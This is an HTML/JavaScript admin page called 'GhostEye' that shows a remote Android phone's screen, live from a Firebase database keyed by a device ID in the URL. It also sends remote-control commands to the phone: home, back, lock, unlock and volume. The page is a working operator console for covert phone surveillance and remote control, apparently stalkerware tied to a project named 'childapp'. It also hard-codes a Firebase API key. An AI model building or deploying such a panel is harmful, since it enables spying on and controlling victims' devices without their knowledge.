<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>GhostEye Admin Panel</title>
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <script type="module" src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js"></script>
    <script type="module" src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js"></script>

    <style>
        :root {
            --bg-color: #050505;
            --panel-bg: #1a1a1a;
            --accent: #00ff88;
            --danger: #ff3333;
            --text-main: #ffffff;
        }

        body {
            margin: 0; background-color: var(--bg-color); color: var(--text-main);
            font-family: 'Segoe UI', sans-serif; height: 100vh; display: flex; flex-direction: column; overflow: hidden;
        }

        /* --- Header --- */
        .top-nav {
            padding: 15px 20px; background: var(--panel-bg); border-bottom: 1px solid #333;
            display: flex; justify-content: space-between; align-items: center; z-index: 10;
        }
        .brand { font-size: 1.2rem; font-weight: bold; color: var(--accent); letter-spacing: 1px; }
        .status-badge { font-size: 0.9rem; display: flex; align-items: center; gap: 8px; }
        .live-dot { height: 10px; width: 10px; background-color: var(--danger); border-radius: 50%; box-shadow: 0 0 5px var(--danger); }
        .live-dot.active { background-color: var(--accent); box-shadow: 0 0 8px var(--accent); }

        /* --- Main Layout --- */
        .screen-container {
            flex: 1; display: flex; justify-content: center; align-items: center; padding: 20px; position: relative;
        }

        /* --- Phone Frame --- */
        .phone-frame {
            width: 300px; height: 600px; border: 8px solid #222; border-radius: 30px;
            background: #000; position: relative; box-shadow: 0 0 50px rgba(0,0,0,0.5);
            overflow: hidden; display: flex; align-items: center; justify-content: center;
        }
        #screenStream { width: 100%; height: 100%; object-fit: contain; }
        
        .offline-msg { position: absolute; color: #444; text-align: center; display: flex; flex-direction: column; align-items: center; }

        /* --- Controls --- */
        .side-panel {
            position: absolute; right: 30px; display: flex; flex-direction: column; gap: 15px;
            background: rgba(26, 26, 26, 0.8); padding: 15px; border-radius: 20px; border: 1px solid #333;
        }
        .control-btn {
            width: 50px; height: 50px; border-radius: 50%; background: #2a2a2a; border: 1px solid #444;
            color: white; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: 0.2s; font-size: 1.2rem;
        }
        .control-btn:hover { border-color: var(--accent); color: var(--accent); transform: scale(1.1); }
        .control-btn:active { transform: scale(0.9); }

        /* Navigation Bar */
        .nav-bar {
            width: 100%; height: 50px; background: rgba(0, 0, 0, 0.8);
            position: absolute; bottom: 0; display: flex; justify-content: space-around; align-items: center; border-top: 1px solid #222;
        }
        .nav-item { color: #666; font-size: 1.2rem; cursor: pointer; padding: 10px; }
        .nav-item:hover { color: white; }

        @media (max-width: 768px) {
            .screen-container { flex-direction: column; }
            .side-panel { position: relative; right: auto; flex-direction: row; margin-top: 20px; flex-wrap: wrap; justify-content: center; width: 100%; max-width: 300px; }
            .phone-frame { width: 100%; max-width: 320px; height: auto; aspect-ratio: 9/19; }
        }
    </style>
</head>
<body>

    <div class="top-nav">
        <div class="brand"><i class="fa-solid fa-ghost"></i> GHOST EYE</div>
        <div class="status-badge">
            <span class="live-dot" id="dot"></span> 
            <span id="statusText" style="color:#888">System Ready</span>
        </div>
    </div>

    <div class="screen-container">
        <div class="phone-frame">
            <div id="offlineMsg" class="offline-msg">
                <i class="fa-solid fa-satellite-dish fa-2x" style="margin-bottom: 10px;"></i>
                <p id="msgText">Enter Device ID in URL<br>(e.g., ?id=123456)</p>
            </div>
            <img id="screenStream" src="" alt="">
            
            <div class="nav-bar">
                <div class="nav-item" id="btnRecent" title="Recent Apps"><i class="fa-regular fa-square"></i></div>
                <div class="nav-item" id="btnHome" title="Home"><i class="fa-regular fa-circle"></i></div>
                <div class="nav-item" id="btnBack" title="Back"><i class="fa-solid fa-caret-left" style="font-size:1.5rem"></i></div>
            </div>
        </div>

        <div class="side-panel">
            <div class="control-btn" id="btnLock" title="Lock Screen"><i class="fa-solid fa-lock"></i></div>
            <div class="control-btn" id="btnUnlock" title="Wake Screen"><i class="fa-solid fa-lock-open"></i></div>
            <div class="control-btn" id="btnVolUp" title="Vol +"><i class="fa-solid fa-plus"></i></div>
            <div class="control-btn" id="btnVolDown" title="Vol -"><i class="fa-solid fa-minus"></i></div>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getDatabase, ref, onValue, set } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

        // âœ… à¤†à¤ªà¤•à¥€ ID à¤”à¤° CONFIG à¤¯à¤¹à¤¾à¤ à¤²à¤—à¥€ à¤¹à¥à¤ˆ à¤¹à¥ˆ
        const firebaseConfig = {
            apiKey: "AIzaSyDs5ubX4MGyVoCHIJXXgWBpU7wgoS5jcDM",
            authDomain: "childapp-ce1fe.firebaseapp.com",
            databaseURL: "https://childapp-ce1fe-default-rtdb.firebaseio.com",
            projectId: "childapp-ce1fe",
            storageBucket: "childapp-ce1fe.firebasestorage.app",
            messagingSenderId: "108035285372",
            appId: "1:108035285372:web:generated_placeholder"
        };

        // Initialize Firebase
        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        // Get ID from URL (?id=123456)
        const urlParams = new URLSearchParams(window.location.search);
        const currentDeviceId = urlParams.get('id');

        if (!currentDeviceId) {
            document.getElementById('statusText').innerText = "ID Missing";
            document.getElementById('statusText').style.color = "var(--danger)";
        } else {
            console.log("Tracking Device:", currentDeviceId);
            document.getElementById('statusText').innerText = "Connecting...";

            // ðŸ”¥ Image Listener (Phone ki Screen dekhne ke liye)
            const imageRef = ref(db, 'live_screens/' + currentDeviceId + '/image');
            
            onValue(imageRef, (snapshot) => {
                const base64String = snapshot.val();
                
                if (base64String) {
                    document.getElementById('offlineMsg').style.display = "none";
                    document.getElementById('screenStream').src = "data:image/jpeg;base64," + base64String;
                    
                    document.getElementById('statusText').innerText = "LIVE: " + currentDeviceId;
                    document.getElementById('statusText').style.color = "var(--accent)";
                    document.getElementById('dot').classList.add("active");
                } else {
                    console.log("Waiting for data...");
                }
            }, (error) => {
                console.error("Firebase Error:", error);
                document.getElementById('msgText').innerText = "Permission Denied\nCheck Database Rules";
            });
        }

        // --- ðŸ‘‡ BUTTONS LOGIC (COMMANDS) ðŸ‘‡ ---
        // à¤¯à¤¹ à¤«à¤‚à¤•à¥à¤¶à¤¨ Firebase à¤®à¥‡à¤‚ à¤•à¤®à¤¾à¤‚à¤¡ à¤²à¤¿à¤–à¤¤à¤¾ à¤¹à¥ˆ, à¤”à¤° à¥žà¥‹à¤¨ à¤‰à¤¸à¥‡ à¤ªà¤•à¥œ à¤²à¥‡à¤¤à¤¾ à¤¹à¥ˆ
        function sendCommand(action) {
            if(!currentDeviceId) {
                alert("URL me ID nahi hai!");
                return;
            }

            console.log("Sending Command:", action);
            
            // ðŸ”¥ Database me 'command' path par data bhejna
            set(ref(db, 'live_screens/' + currentDeviceId + '/command'), {
                action: action,
                timestamp: Date.now() // Timestamp zaruri hai taki har command naya lage
            }).then(() => {
                console.log("Command sent successfully!");
            }).catch((error) => {
                alert("Error Sending Command: " + error.message);
            });
        }

        // --- BUTTON CLICKS ---
        document.getElementById('btnRecent').onclick = () => sendCommand('recent');
        document.getElementById('btnHome').onclick = () => sendCommand('home');
        document.getElementById('btnBack').onclick = () => sendCommand('back');
        
        document.getElementById('btnLock').onclick = () => sendCommand('lock');
        document.getElementById('btnUnlock').onclick = () => sendCommand('unlock');
        document.getElementById('btnVolUp').onclick = () => sendCommand('volume_up');
        document.getElementById('btnVolDown').onclick = () => sendCommand('volume_down');

    </script>
</body>
</html>
